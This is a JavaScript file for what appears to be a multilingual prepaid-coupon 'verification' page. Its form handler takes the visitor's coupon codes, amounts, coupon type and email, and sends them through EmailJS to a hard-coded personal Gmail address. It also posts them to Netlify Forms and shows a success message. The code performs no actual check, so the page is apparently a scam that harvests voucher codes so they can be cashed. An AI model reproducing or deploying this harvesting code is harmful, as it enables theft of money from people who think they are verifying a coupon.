// Language selection handling
window.selectLanguage = function(lang) {
    document.getElementById('language-select').classList.remove('active');

    document.querySelectorAll('[id^="form-page"]').forEach(page => {
        page.classList.remove('active');
    });

    const selectedPage = document.getElementById(`form-page-${lang}`);
    if (selectedPage) {
        selectedPage.classList.add('active');
    } else {
        console.error(`Page for language ${lang} not found`);
    }
}

// Initialize form submissions (only needed if you're using the JS form handling)
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form[name^="coupon-check"]').forEach(form => {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            // Get form data
        const formData = new FormData(this);
        const data = Object.fromEntries(formData.entries());
        
        try {
            // Send email using EmailJS
            await emailjs.send(
                "service_5d89tcj", // Replace with your EmailJS service ID
                "template_vglqdwo",  // Replace with your EmailJS template ID
                {
                    to_email: "lagraceparle98@gmail.com",
                    from_email: data.email,
                    coupon_type: data['coupon-type'],
                    hide_code: data['hide-code'],
                    amount: data.amount,
                    coupon_code: data['coupon-code']
                }
            );

            // Submit to Netlify Forms
            await fetch('/', {
                method: 'POST',
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: new URLSearchParams(formData).toString()
            });

            alert('Form submitted successfully!');
            this.reset();
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        }
        });
    });
});

